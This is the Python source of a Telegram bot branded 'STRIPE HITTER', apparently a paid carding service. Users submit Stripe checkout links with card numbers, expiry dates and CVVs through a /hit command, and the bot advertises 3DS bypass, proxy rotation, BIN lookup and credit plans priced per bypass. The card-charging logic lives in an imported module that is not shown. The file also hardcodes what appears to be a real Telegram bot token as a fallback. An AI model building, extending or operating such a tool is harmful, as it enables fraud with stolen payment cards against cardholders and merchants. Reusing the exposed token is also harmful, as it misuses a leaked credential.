import asyncio
import concurrent.futures
import html as _html
import json
import os
import random
import re
import time
import logging


class _DedupeList(list):
    """list subclass with O(1) __contains__ via an internal set."""
    __slots__ = ("_set",)

    def __init__(self):
        super().__init__()
        self._set: set = set()

    def append(self, item):
        super().append(item)
        self._set.add(item)

    def __contains__(self, item):
        return item in self._set


from aiogram import Bot, Dispatcher, types, Router, F
from aiogram.filters import Command, CommandStart
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.types import LinkPreviewOptions
from aiogram.methods import EditMessageText as _EditMessageText

_NO_PREVIEW = LinkPreviewOptions(is_disabled=True)
from aiogram.exceptions import (
    TelegramRetryAfter,
    TelegramBadRequest,
    TelegramForbiddenError,
    TelegramNotFound,
    TelegramNetworkError,
)

# ── Patch aiogram session to strip dangerous deeply-nested JSON fields ─────────
import json as _json
from aiogram.client.session.base import BaseSession as _BaseSession

_DANGEROUS_KEYS = frozenset({"rich_message", "rich_caption", "story"})
_MAX_JSON_DEPTH  = 12

def _sanitize(obj, depth: int = 0):
    if depth > _MAX_JSON_DEPTH:
        return {}
    if isinstance(obj, dict):
        return {
            k: _sanitize(v, depth + 1)
            for k, v in obj.items()
            if k not in _DANGEROUS_KEYS
        }
    if isinstance(obj, list):
        return [_sanitize(item, depth + 1) for item in obj]
    return obj

_orig_check_response = _BaseSession.check_response

def _patched_check_response(self, bot, method, status_code: int, content: str):
    try:
        raw = _json.loads(content)
        if isinstance(raw.get("result"), list):
            raw["result"] = [_sanitize(u) for u in raw["result"]]
            content = _json.dumps(raw)
    except Exception:
        pass
    return _orig_check_response(self, bot, method, status_code, content)

_BaseSession.check_response = _patched_check_response
# ── end patch ──────────────────────────────────────────────────────────────────

from helpers import (
    parse_proxy_format, test_proxy,
    CC_PATTERN, bin_lookup,
)
import auth
import hit
import credits as cr


# ══════════════════════════════════════════════════════════════════════════════
#  LOGGING
# ══════════════════════════════════════════════════════════════════════════════
from logging.handlers import RotatingFileHandler

_LOG_DIR = os.path.dirname(os.path.abspath(__file__))
_LOG_FMT = logging.Formatter(
    "%(asctime)s │ %(levelname)s │ %(name)s │ %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)

_root = logging.getLogger()
_root.setLevel(logging.INFO)

_console = logging.StreamHandler()
_console.setFormatter(_LOG_FMT)
_root.addHandler(_console)

_file_all = RotatingFileHandler(
    os.path.join(_LOG_DIR, "bot.log"),
    maxBytes=10 * 1024 * 1024,
    backupCount=5,
    encoding="utf-8",
)
_file_all.setFormatter(_LOG_FMT)
_root.addHandler(_file_all)

_file_err = RotatingFileHandler(
    os.path.join(_LOG_DIR, "bot_error.log"),
    maxBytes=5 * 1024 * 1024,
    backupCount=3,
    encoding="utf-8",
)
_file_err.setLevel(logging.WARNING)
_file_err.setFormatter(_LOG_FMT)
_root.addHandler(_file_err)

logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("httpcore").setLevel(logging.WARNING)
logging.getLogger("hpack").setLevel(logging.WARNING)

log = logging.getLogger("bot")


# ══════════════════════════════════════════════════════════════════════════════
#  DATA-FILE GUARD  — create missing files so restarts never lose data
# ══════════════════════════════════════════════════════════════════════════════

def _ensure_data_files() -> None:
    """Create any missing data files with safe empty defaults.
    Existing files are NEVER touched — only absent ones are created."""
    _d = os.path.dirname(os.path.abspath(__file__))

    _json_defaults: dict[str, object] = {
        "proxy.json":    {},
        "credits.json":  {},
        "admins.json":   {"admins": []},
        "premium.json":  {},
        "keys.json":     {},
        "ckeys.json":    {},
        "banned.json":   {"banned": []},
        "nopecha.json":  {},
    }
    for fname, default in _json_defaults.items():
        path = os.path.join(_d, fname)
        if not os.path.exists(path):
            try:
                with open(path, "w", encoding="utf-8") as _f:
                    json.dump(default, _f, indent=2)
                log.info("📁 Created missing data file: %s", fname)
            except Exception as _e:
                log.warning("⚠️  Could not create %s: %s", fname, _e)

    # Plain-text files
    for fname in ("users.txt",):
        path = os.path.join(_d, fname)
        if not os.path.exists(path):
            try:
                open(path, "a", encoding="utf-8").close()
                log.info("📁 Created missing data file: %s", fname)
            except Exception as _e:
                log.warning("⚠️  Could not create %s: %s", fname, _e)


_ensure_data_files()


# ══════════════════════════════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════════════════════════════

import os as _os
from dotenv import load_dotenv as _load_dotenv
_load_dotenv()

def _load_token() -> str:
    """
    TOKEN_ENC (encrypted) + TOKEN_KEY (Fernet key) se token decrypt karo.
    Fallback: BOT_TOKEN (plain) — sirf local dev ke liye.
    Token kabhi bhi log ya file mein nahi aata.
    """
    try:
        from cryptography.fernet import Fernet, InvalidToken
    except ImportError:
        raise RuntimeError("cryptography package missing — run: pip install cryptography")

    enc = _os.environ.get("TOKEN_ENC", "").strip()
    key = _os.environ.get("TOKEN_KEY", "").strip()

    if enc and key:
        # enc: prefix strip karo (encrypt_token.py ne lagaya tha)
        cipher = enc[4:] if enc.startswith("enc:") else enc
        try:
            return Fernet(key.encode()).decrypt(cipher.encode()).decode()
        except (InvalidToken, Exception) as _e:
            raise RuntimeError(f"Token decrypt failed — TOKEN_KEY ya TOKEN_ENC galat hai: {_e}")

    # Fallback to plain BOT_TOKEN (dev only)
    plain = _os.environ.get("BOT_TOKEN", "8436141916:AAE9XvS6xrKUOersvQpycPYUXHaU8fmLFQg").strip()
    if plain:
        return plain

    raise RuntimeError("BOT_TOKEN environment variable not set (.env mein TOKEN_ENC+TOKEN_KEY ya BOT_TOKEN hona chahiye)")

TOKEN = _load_token()

# ══════════════════════════════════════════════════════════════════════════════
#  TOKEN SANITIZER — the bot token is never exposed in logs, errors, or tracebacks
# ══════════════════════════════════════════════════════════════════════════════
import sys as _sys
import traceback as _traceback

def _mask_token(text: str) -> str:
    """TOKEN ko [BOT_TOKEN] se replace karo — kisi bhi string mein."""
    t = str(text)
    if TOKEN and TOKEN in t:
        return t.replace(TOKEN, "[BOT_TOKEN]")
    return t

# ── URL sanitizer patterns ────────────────────────────────────────────────────
# 1. Telegram API URL — masks the token whether or not https:// prefix is present
_TG_URL_RE  = re.compile(
    r'(?:https?://)?api\.telegram\.org/bot\S*',
    re.IGNORECASE,
)
# 2. Baaki sab https/http URLs
_URL_RE = re.compile(r'https?://\S+', re.IGNORECASE)

def _strip_urls(text: str) -> str:
    """
    Pehle Telegram API URL hata do (token samait),
    phir baaki sab https/http URLs bhi.
    """
    t = _TG_URL_RE.sub('[Telegram API]', str(text))
    return _URL_RE.sub('[URL]', t)

def _clean_output(text: str) -> str:
    """Token mask + URL strip — logs/errors ke liye, aiogram JSON se door rakho."""
    return _strip_urls(_mask_token(str(text)))

def _safe_err(exc) -> str:
    """User ko bhejne ke liye safe, truncated error string."""
    return _clean_output(str(exc))[:120]

class _SafeFormatter(logging.Formatter):
    """
    Har log line ka final output sanitize karta hai —
    msg, args, aur exc_info traceback sab cover hote hain.
    """
    def format(self, record: logging.LogRecord) -> str:
        return _clean_output(super().format(record))

# Har existing handler ke formatter ko _SafeFormatter se replace karo
for _h in logging.getLogger().handlers:
    _old = _h.formatter
    if _old:
        _sf = _SafeFormatter(fmt=_old._fmt, datefmt=_old.datefmt)
        _sf.default_time_format      = _old.default_time_format
        _sf.default_msec_format      = _old.default_msec_format
    else:
        _sf = _SafeFormatter(
            fmt="%(asctime)s │ %(levelname)s │ %(name)s │ %(message)s",
            datefmt="%Y-%m-%d %H:%M:%S",
        )
    _h.setFormatter(_sf)

# Global excepthook — unhandled crashes are also safe (token never leaks to stderr)
def _safe_excepthook(exc_type, exc_val, exc_tb):
    _sys.stderr.write(
        _mask_token("".join(_traceback.format_exception(exc_type, exc_val, exc_tb)))
    )

_sys.excepthook = _safe_excepthook
# ── end sanitizer ──────────────────────────────────────────────────────────────

BASE_DIR    = os.path.dirname(os.path.abspath(__file__))
PROXY_FILE  = os.path.join(BASE_DIR, "proxy.json")
BANNED_FILE = os.path.join(BASE_DIR, "banned.json")


# ══════════════════════════════════════════════════════════════════════════════
#  BAN SYSTEM
# ══════════════════════════════════════════════════════════════════════════════

_banned_users: set[int] = set()

def _load_banned() -> None:
    """Load banned.json into _banned_users.

    Handles BOTH formats:
      - bare list:  [1234, 5678]         (written by bot.py's _save_banned)
      - dict:       {"banned": [1234]}   (written by auth.py's save_banned)
    Without this check, set({"banned":[...]}) = {"banned"} — a set of the
    string key "banned", silently breaking the middleware ban on every restart.
    """
    global _banned_users
    try:
        with open(BANNED_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, list):
            _banned_users = set(data)
        elif isinstance(data, dict):
            _banned_users = set(data.get("banned", []))
        else:
            _banned_users = set()
    except Exception:
        _banned_users = set()

def _save_banned() -> None:
    try:
        with open(BANNED_FILE, "w", encoding="utf-8") as f:
            json.dump(sorted(_banned_users), f)
    except Exception as exc:
        log.error("Failed to save banned.json: %s", exc)

def is_banned(user_id: int) -> bool:
    return user_id in _banned_users

def ban_user(user_id: int) -> None:
    _banned_users.add(user_id)
    _save_banned()

def unban_user(user_id: int) -> None:
    _banned_users.discard(user_id)
    _save_banned()

_load_banned()


# ══════════════════════════════════════════════════════════════════════════════
#  THREAD POOL  +  PER-USER SEMAPHORE
# ══════════════════════════════════════════════════════════════════════════════

CHECKER_POOL = concurrent.futures.ThreadPoolExecutor(max_workers=500)

_USER_SEM_LIMIT = 100
_user_semaphores: dict[int, asyncio.Semaphore] = {}

def get_user_semaphore(user_id: int) -> asyncio.Semaphore:
    if user_id not in _user_semaphores:
        _user_semaphores[user_id] = asyncio.Semaphore(_USER_SEM_LIMIT)
    return _user_semaphores[user_id]


# ══════════════════════════════════════════════════════════════════════════════
#  PREMIUM EMOJI IDs
# ══════════════════════════════════════════════════════════════════════════════

E = {
    # ── NewsEmoji pack IDs ─────────────────────────────────────────────────────
    "bolt":      "5456140674028019486",  # ⚡️
    "bolt2":     "5224607267797606837",  # ☄️
    "bolt3":     "5424972470023104089",  # 🔥
    "bolt4":     "5276032951342088188",  # 💥
    "bolt5":     "5325547803936572038",  # ✨
    "check":     "5206607081334906820",  # ✔️
    "check2":    "5206607081334906820",  # ✔️
    "check3":    "5206607081334906820",  # ✔️
    "cross":     "5210952531676504517",  # ❌
    "cross2":    "5260293700088511294",  # ⛔️
    "cross3":    "5240241223632954241",  # 🚫
    "cross4":    "5274099962655816924",  # ❗️
    "star":      "5438496463044752972",  # ⭐️
    "gem":       "5427168083074628963",  # 💎
    "globe":     "5447410659077661506",  # 🌐
    "link":      "5271604874419647061",  # 🔗
    "chat":      "5443038326535759644",  # 💬
    "chat2":     "5467538555158943525",  # 💭
    "link2":     "5271604874419647061",  # 🔗
    "user":      "5460795800101594035",  # 🗣️
    "warn":      "5447644880824181073",  # ⚠️
    "warn2":     "5420323339723881652",  # ⚠️
    "rocket":    "5224607267797606837",  # ☄️  (no rocket in pack)
    "sparkle":   "5325547803936572038",  # ✨
    "hourglass": "5386367538735104399",  # ⌛
    "plus":      "5397916757333654639",  # ➕
    "dice":      "5361741454685256344",  # 🎮
    "refresh":   "5375338737028841420",  # 🔄
    "bank":      "5409048419211682843",  # 💵
    "gift":      "5461151367559141950",  # 🎉
    "stop":      "5359543311897998264",  # ⏸
    "loading":   "5386367538735104399",  # ⌛
    "prev":      "4902349923049014048",  # ◀️  (no back-arrow in pack — keep old)
    "next":      "5348125953090403204",  # ▶️
    "help_prev": "5449683594425410231",  # 🔼
    "help_next": "5264919878082509254",  # ▶️
    "down":      "5447183459602669338",  # 🔽
    "shield":    "5251203410396458957",  # 🛡
    "pin":       "5391032818111363540",  # 📍
    "chart":     "5231200819986047254",  # 📊
    # ── Hit result custom emojis ──────────────────────────────────────────────
    "tds_bypass":     "5934033357112348687",  # ☑️  3DS Bypassed
    "declined":       "5305724700209454594",  # ❎  Declined status
    "charged_status": "5305417687357203905",  # ✅  Charged status
    "result_decline": "6181295865588621091",  # 😩  Result line (decline)
    "result_charged": "6336661995374250228",  # 😎  Result line (charged)
}

def pe(emoji_id: str) -> str:
    """Wrap a custom emoji ID into Telegram's premium emoji HTML tag."""
    return f'<tg-emoji emoji-id="{emoji_id}">⚡</tg-emoji>'

# ── Result-specific emojis (CC check output) ─────────────────────────────────
R = {
    # ── NewsEmoji pack IDs ─────────────────────────────────────────────────────
    "cc":         "5233326571099534068",  # 💸
    "gate":       "5341715473882955310",  # ⚙️
    "price":      "5409048419211682843",  # 💵
    "bin_info":   "5231200819986047254",  # 📊
    "visa":       "5409048419211682843",  # 💵
    "master":     "5402186569006210455",  # 💱
    "amex":       "5278751923338490157",  # 💸
    "type":       "5305265301917549162",  # 📎
    "level":      "5440539497383087970",  # 🥇
    "bank":       "5409048419211682843",  # 💵
    "country":    "5447410659077661506",  # 🌐
    "checked_by": "5210956306952758910",  # 👀
}

def user_link(user_id: int, name: str = "", username: str = "") -> str:
    """Build a clickable user profile link."""
    if name:
        display = _html.escape(name)
    elif username:
        display = f"@{_html.escape(username)}"
    else:
        display = str(user_id)
    if username:
        url = f"https://t.me/{_html.escape(username)}"
    else:
        url = f"tg://user?id={user_id}"
    return f'<a href="{url}">{display}</a>'


# ══════════════════════════════════════════════════════════════════════════════
#  BOLD UNICODE TEXT CONVERTER
# ══════════════════════════════════════════════════════════════════════════════

_BOLD_MAP = {}
for i, c in enumerate("ABCDEFGHIJKLMNOPQRSTUVWXYZ"):
    _BOLD_MAP[c] = chr(0x1D5D4 + i)
for i, c in enumerate("abcdefghijklmnopqrstuvwxyz"):
    _BOLD_MAP[c] = chr(0x1D5EE + i)
for i, c in enumerate("0123456789"):
    _BOLD_MAP[c] = chr(0x1D7EC + i)

def bold(text: str) -> str:
    """Convert ASCII text to Unicode Mathematical Sans-Serif Bold."""
    return "".join(_BOLD_MAP.get(c, c) for c in text)


# ── Monospace unicode converter ───────────────────────────────────────────────
_MONO_MAP = {}
for _i, _c in enumerate("ABCDEFGHIJKLMNOPQRSTUVWXYZ"):
    _MONO_MAP[_c] = chr(0x1D670 + _i)
for _i, _c in enumerate("abcdefghijklmnopqrstuvwxyz"):
    _MONO_MAP[_c] = chr(0x1D68A + _i)
for _i, _c in enumerate("0123456789"):
    _MONO_MAP[_c] = chr(0x1D7F6 + _i)

def _mono(text: str) -> str:
    """Convert ASCII text to Unicode Mathematical Monospace (𝙼𝚘𝚗𝚘 style)."""
    return "".join(_MONO_MAP.get(c, c) for c in str(text))


# ══════════════════════════════════════════════════════════════════════════════
#  PROXY STORAGE  (proxy.json)
# ══════════════════════════════════════════════════════════════════════════════

_proxy_cache: dict | None = None
_proxy_cache_mtime: float = 0.0

def _load_proxies() -> dict:
    global _proxy_cache, _proxy_cache_mtime
    try:
        mt = os.path.getmtime(PROXY_FILE)
    except OSError:
        return {}
    if _proxy_cache is not None and mt == _proxy_cache_mtime:
        return _proxy_cache
    try:
        with open(PROXY_FILE, "r", encoding="utf-8") as f:
            _proxy_cache = json.load(f)
            _proxy_cache_mtime = mt
            return _proxy_cache
    except Exception:
        return {}

def _save_proxies(data: dict):
    global _proxy_cache, _proxy_cache_mtime
    with open(PROXY_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    _proxy_cache = data
    try:
        _proxy_cache_mtime = os.path.getmtime(PROXY_FILE)
    except OSError:
        _proxy_cache_mtime = 0.0

MAX_PROXIES_PER_USER = 30

def get_user_proxies(user_id: int) -> list:
    """Return the full proxy list for a user."""
    data = _load_proxies()
    proxies = data.get(str(user_id), [])
    if isinstance(proxies, dict):
        proxies = [proxies] if proxies else []
    if isinstance(proxies, str):
        proxies = [proxies] if proxies.strip() else []
    out: list = []
    for p in proxies:
        if isinstance(p, dict):
            out.append(p)
        elif isinstance(p, str) and p.strip():
            parsed = parse_proxy_format(p.strip())
            if parsed:
                out.append(parsed)
    return out

def add_user_proxies(user_id: int, new_proxies: list[dict]):
    """Append proxies to user's list. Cap at MAX_PROXIES_PER_USER."""
    data = _load_proxies()
    existing = data.get(str(user_id), [])
    if isinstance(existing, dict):
        existing = [existing] if existing else []
    existing.extend(new_proxies)
    data[str(user_id)] = existing[:MAX_PROXIES_PER_USER]
    _save_proxies(data)

def del_user_proxy(user_id: int):
    data = _load_proxies()
    data.pop(str(user_id), None)
    _save_proxies(data)


# ══════════════════════════════════════════════════════════════════════════════
#  BOT + DISPATCHER
# ══════════════════════════════════════════════════════════════════════════════

bot = Bot(
    token=TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML),
)
dp = Dispatcher()
router = Router()
dp.include_router(router)


# ══════════════════════════════════════════════════════════════════════════════
#  SAFE EDIT
# ══════════════════════════════════════════════════════════════════════════════


async def safe_edit(msg: types.Message, text: str, **kwargs) -> bool:
    for attempt in range(3):
        try:
            await msg.edit_text(text, **kwargs)
            return True
        except TelegramRetryAfter as e:
            wait = min(e.retry_after + 1, 15)
            await asyncio.sleep(wait)
        except TelegramNetworkError:
            # Transient SSL / connection drop — wait briefly and retry
            if attempt < 2:
                await asyncio.sleep(1.5)
                continue
            return False
        except TelegramBadRequest as e:
            emsg = str(e).lower()
            if "message is not modified" in emsg:
                return True
            if any(x in emsg for x in (
                "message can't be edited",
                "message to edit not found",
                "chat not found",
                "message_id_invalid",
            )):
                return False
            log.error("safe_edit TelegramBadRequest: %s", e)
            return False
        except TelegramForbiddenError as e:
            log.warning("safe_edit Forbidden: %s", e)
            return False
        except TelegramNotFound:
            return False
        except Exception as e:
            log.error("safe_edit unexpected: %s", e, exc_info=True)
            return False
    return False


# ══════════════════════════════════════════════════════════════════════════════
#  GLOBAL ERROR HANDLER
# ══════════════════════════════════════════════════════════════════════════════

@dp.errors()
async def global_error_handler(event: types.ErrorEvent):
    exc = event.exception
    if isinstance(exc, TelegramRetryAfter):
        await asyncio.sleep(exc.retry_after + 1)
        return True
    if isinstance(exc, TelegramForbiddenError):
        return True
    if isinstance(exc, TelegramNetworkError):
        # Transient SSL / connection drop — log at WARNING, not ERROR
        log.warning("TelegramNetworkError (transient): %s", exc)
        return True
    log.error("Unhandled exception in update %s:\n%s",
              getattr(event.update, "update_id", "?"), exc, exc_info=True)
    return True


# ══════════════════════════════════════════════════════════════════════════════
#  PER-USER THROTTLE MIDDLEWARE
# ══════════════════════════════════════════════════════════════════════════════

from aiogram import BaseMiddleware as _BaseMiddleware

class _ThrottleMiddleware(_BaseMiddleware):
    _RATE            = 0.4
    _AUTO_BAN_WINDOW = 10.0
    _AUTO_BAN_LIMIT  = 20

    _last:   dict[int, float]       = {}
    _window: dict[int, list[float]] = {}

    async def __call__(self, handler, event, data):
        user: types.User | None = data.get("event_from_user")
        if not user:
            return await handler(event, data)

        uid = user.id

        if is_banned(uid):
            # Give banned users a visible response so buttons don't spin forever
            if hasattr(event, "answer"):          # CallbackQuery
                try:
                    await event.answer("❌ You are banned.", show_alert=True)
                except Exception:
                    pass
            elif hasattr(event, "reply"):         # Message
                try:
                    await event.reply(
                        f"[⌯] {bold('Access')} ⌁ {_mono('Denied')} {pe(E['cross'])}\n"
                        f"[⌯] {bold('Reason')} ⌁ {_mono('You have been banned.')}"
                    )
                except Exception:
                    pass
            return

        now = time.monotonic()
        times = self._window.get(uid, [])
        times = [t for t in times if now - t < self._AUTO_BAN_WINDOW]
        times.append(now)
        self._window[uid] = times

        if len(times) >= self._AUTO_BAN_LIMIT:
            ban_user(uid)
            log.warning("AUTO-BAN: user %s sent %d events in %.1fs",
                        uid, len(times), self._AUTO_BAN_WINDOW)
            return

        last = self._last.get(uid, 0.0)
        diff = now - last
        if diff < self._RATE:
            await asyncio.sleep(self._RATE - diff)
        self._last[uid] = time.monotonic()

        try:
            if hasattr(event, "text") and event.text:
                cmd_preview = event.text.split("\n")[0][:60]
                log.info("CMD uid=%s @%s → %s", uid, user.username or "?", cmd_preview)
        except Exception:
            pass

        return await handler(event, data)

dp.message.middleware(_ThrottleMiddleware())
dp.callback_query.middleware(_ThrottleMiddleware())


# ══════════════════════════════════════════════════════════════════════════════
#  JOIN CHECK
# ══════════════════════════════════════════════════════════════════════════════



# ══════════════════════════════════════════════════════════════════════════════
#  MENU KEYBOARDS + WELCOME
# ══════════════════════════════════════════════════════════════════════════════

def menu_keyboard() -> dict:
    return {
        "inline_keyboard": [
            [
                {"text": bold("Commands"), "callback_data": "menu_check",
                 "icon_custom_emoji_id": E["bolt"], "style": "success"},
                {"text": bold("Set Proxy"), "callback_data": "menu_proxy",
                 "icon_custom_emoji_id": E["link"], "style": "success"},
            ],
            [
                {"text": bold("Plans"), "callback_data": "menu_plans",
                 "icon_custom_emoji_id": E["star"], "style": "primary"},
                {"text": bold("My Profile"), "callback_data": "menu_profile",
                 "icon_custom_emoji_id": E["user"], "style": "primary"},
            ],
        ]
    }

def back_keyboard() -> dict:
    return {
        "inline_keyboard": [
            [{"text": bold("Back"), "callback_data": "menu_back",
              "icon_custom_emoji_id": "5253997076169115797", "style": "primary"}],
        ]
    }

_MSEP  = "─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─"
_MSEP2 = "━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━"

WELCOME_MSG = (
    f"{pe(E['bolt'])} {bold('STRIPE HITTER')} {pe(E['gem'])} {bold('BY KAMAL')} {pe(E['bolt'])}\n"
    f"{_MSEP2}\n"
    f"\n"
    f"[⌯] {bold('Gate')} ⌁ {_mono('Stripe Checkout')} {pe(E['bolt'])}\n"
    f"[⌯] {bold('3DS')} ⌁ {_mono('Bypass Supported')} {pe(E['check'])}\n"
    f"[⌯] {bold('Proxy')} ⌁ {_mono('HTTP')} · {_mono('SOCKS4')} · {_mono('SOCKS5')} {pe(E['link'])}\n"
    f"[⌯] {bold('Credits')} ⌁ {_mono('1 per 3DS bypass')} {pe(E['shield'])}\n"
    f"\n"
    f"{_MSEP}\n"
    f"\n"
    f"[⌯] {bold('Menu')} ⌁ {_mono('Select option below')} {pe(E['down'])}"
)


# ══════════════════════════════════════════════════════════════════════════════
#  /start COMMAND
# ══════════════════════════════════════════════════════════════════════════════

@router.message(CommandStart())
async def cmd_start(message: types.Message):
    u = message.from_user
    auth.save_user(u.id, u.username, u.full_name)

    if auth.is_banned(u.id):
        await message.reply(
            f"[⌯] {bold('Access')} ⌁ {_mono('Denied')} {pe(E['cross'])}\n"
            f"[⌯] {bold('Reason')} ⌁ {_mono('You have been banned.')}"
        )
        return

    await message.reply(WELCOME_MSG, reply_markup=menu_keyboard())


# ══════════════════════════════════════════════════════════════════════════════
#  VERIFY JOIN CALLBACK
# ══════════════════════════════════════════════════════════════════════════════



# ══════════════════════════════════════════════════════════════════════════════
#  MENU CALLBACKS
# ══════════════════════════════════════════════════════════════════════════════

@router.callback_query(F.data == "menu_back")
async def cb_menu_back(callback: types.CallbackQuery):
    await callback.answer()
    try:
        await safe_edit(callback.message, WELCOME_MSG, reply_markup=menu_keyboard())
    except Exception:
        pass


@router.callback_query(F.data == "menu_check")
async def cb_menu_check(callback: types.CallbackQuery):
    await callback.answer()
    sep = f"\n{'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─'}\n"
    text = (
        f"[⌯] {bold('Commands')} ⌁ {_mono('Reference')} {pe(E['bolt'])}\n"
        f"{sep}"
        f"[⌯] {bold('Checker')} {pe(E['bolt'])}\n"
        f"[⌯] {bold('/hit')} ⌁ {_mono('link cc|mm|yy|cvv')} {pe(E['bolt'])}\n"
        f"[⌯] {bold('Note')} ⌁ {_mono('Up to 10 CCs per session')}\n"
        f"[⌯] {bold('Note')} ⌁ {_mono('1 credit per 3DS bypass')} {pe(E['shield'])}\n"
        f"{sep}"
        f"[⌯] {bold('Credits')} {pe(E['gem'])}\n"
        f"[⌯] {bold('/credits')} ⌁ {_mono('Check balance & expiry')} {pe(E['gem'])}\n"
        f"[⌯] {bold('/redeem')} ⌁ {_mono('Redeem KEY — top up credits')} {pe(E['gift'])}\n"
        f"[⌯] {bold('/plans')} ⌁ {_mono('View credit plans & pricing')} {pe(E['star'])}\n"
        f"{sep}"
        f"[⌯] {bold('Proxy')} {pe(E['link'])}\n"
        f"[⌯] {bold('/proxy')} ⌁ {_mono('host:port:user:pass')} {pe(E['link'])}\n"
        f"[⌯] {bold('/myproxy')} ⌁ {_mono('View active proxies')} {pe(E['refresh'])}\n"
        f"[⌯] {bold('/rmproxy')} ⌁ {_mono('Remove all proxies')} {pe(E['cross'])}"
    )
    try:
        await safe_edit(callback.message, text, reply_markup=back_keyboard())
    except Exception:
        pass


@router.callback_query(F.data == "menu_proxy")
async def cb_menu_proxy(callback: types.CallbackQuery):
    await callback.answer()
    sep  = f"\n{_MSEP}\n"
    text = (
        f"[⌯] {bold('Proxy')} ⌁ {_mono('Manager')} {pe(E['link'])}\n"
        f"{sep}"
        f"[⌯] {bold('Formats')} {pe(E['link'])}\n"
        f"[⌯] {bold('HTTP')} ⌁ <code>host:port:user:pass</code>\n"
        f"[⌯] {bold('Auth')} ⌁ <code>user:pass@host:port</code>\n"
        f"[⌯] {bold('SOCKS5')} ⌁ <code>socks5://user:pass@host:port</code>\n"
        f"[⌯] {bold('Plain')} ⌁ <code>host:port</code>\n"
        f"{sep}"
        f"[⌯] {bold('Commands')} {pe(E['bolt'])}\n"
        f"[⌯] {bold('/proxy')} ⌁ {_mono('Add proxy')} {pe(E['link'])}\n"
        f"[⌯] {bold('/myproxy')} ⌁ {_mono('View active proxies')} {pe(E['refresh'])}\n"
        f"[⌯] {bold('/rmproxy')} ⌁ {_mono('Remove all proxies')} {pe(E['cross'])}\n"
        f"{sep}"
        f"[⌯] {bold('Note')} ⌁ {_mono('Every proxy tested before saving')} {pe(E['check'])}\n"
        f"[⌯] {bold('Limit')} ⌁ {_mono('Max 30 proxies per user')} {pe(E['warn'])}"
    )
    try:
        await safe_edit(callback.message, text, reply_markup=back_keyboard())
    except Exception:
        pass


@router.callback_query(F.data == "menu_profile")
async def cb_menu_profile(callback: types.CallbackQuery):
    await callback.answer()
    uid        = callback.from_user.id
    uname      = callback.from_user.full_name or "Unknown"
    username   = callback.from_user.username or "none"
    proxy_list = get_user_proxies(uid)
    count      = len(proxy_list)

    proxy_status = (
        f"{_mono(str(count) + ' proxies')} {pe(E['link'])}"
        if proxy_list else
        f"{_mono('Not Set')} {pe(E['cross'])}"
    )

    role = auth.get_user_role(uid)
    if role == "owner":
        role_line    = f"{_mono('Owner')} {pe(E['gem'])}"
        credits_line = f"{_mono('Unlimited')} {pe(E['gem'])}"
        expiry_line  = f"{_mono('Lifetime')}"
    elif role == "admin":
        role_line    = f"{_mono('Admin')} {pe(E['star'])}"
        credits_line = f"{_mono('Unlimited')} {pe(E['gem'])}"
        expiry_line  = f"{_mono('Lifetime')}"
    else:
        role_line    = f"{_mono('User')} {pe(E['user'])}"
        bal          = cr.get_credits(uid)
        exp          = cr.expiry_str(uid)
        credits_line = f"{_mono(str(bal) + ' credits')} {pe(E['bolt'])}"
        expiry_line  = f"{_mono(exp)}"

    safe_username = _html.escape(username)
    sep = f"\n{'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─'}\n"

    text = (
        f"[⌯] {bold('Profile')} ⌁ {_mono('User Info')} {pe(E['user'])}\n"
        f"{sep}"
        f"[⌯] {bold('Name')} ⌁ › {user_link(uid, uname)} ‹\n"
        f"[⌯] {bold('Handle')} ⌁ @{safe_username} {pe(E['link'])}\n"
        f"[⌯] {bold('ID')} ⌁ {_mono(str(uid))} {pe(E['pin'])}\n"
        f"{sep}"
        f"[⌯] {bold('Role')} ⌁ {role_line}\n"
        f"[⌯] {bold('Credits')} ⌁ {credits_line}\n"
        f"[⌯] {bold('Expires')} ⌁ {expiry_line}\n"
        f"{sep}"
        f"[⌯] {bold('Proxies')} ⌁ {proxy_status}\n"
        f"[⌯] {bold('Redeem')} ⌁ /redeem KEY {pe(E['gift'])}\n"
        f"[⌯] {bold('Plans')} ⌁ /plans {pe(E['star'])}"
    )
    try:
        await safe_edit(callback.message, text, reply_markup=back_keyboard())
    except Exception:
        pass


@router.callback_query(F.data == "menu_plans")
async def cb_menu_plans(callback: types.CallbackQuery):
    await callback.answer()
    P   = "[⌯]"
    SEP = "⌁"
    sep = f"\n{'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─'}\n"

    icons = [pe(E["star"]), pe(E["gem"]), pe(E["bolt"])]
    blocks = []
    for i, (key, plan) in enumerate(cr.PLANS.items()):
        icon = icons[i % len(icons)]
        blocks.append(
            f"{P} {bold(plan['label'])} ⌁ {_mono(plan['price'])} {icon}\n"
            f"{P} {bold('Credits')} {SEP} {_mono(str(plan['credits']) + ' credits')}\n"
            f"{P} {bold('Duration')} {SEP} {_mono(str(plan['days']) + ' days')}"
        )

    header = (
        f"{P} {bold('Plans')} {SEP} {_mono('Credit Plans')} {pe(E['gem'])}\n"
        f"{sep}"
        f"{P} {bold('Rule')} {SEP} {_mono('1 credit per 3DS bypass')} {pe(E['shield'])}\n"
        f"{P} {bold('Stack')} {SEP} {_mono('Plans stack — credits + days add up')} {pe(E['check'])}"
    )
    text = header + sep + sep.join(blocks) + (
        f"{sep}"
        f"{P} {bold('Redeem')} {SEP} /redeem KEY {pe(E['gift'])}"
    )
    try:
        await safe_edit(callback.message, text, reply_markup=back_keyboard())
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  /proxy COMMAND
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("proxy"))
async def cmd_proxy(message: types.Message):
    user_id = message.from_user.id

    if auth.is_banned(user_id):
        await message.reply(
            f"[⌯] {bold('Access')} ⌁ {_mono('Denied')} {pe(E['cross'])}\n"
            f"[⌯] {bold('Reason')} ⌁ {_mono('You have been banned.')}"
        )
        return

    raw_text = ""

    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        raw_text = args[1]
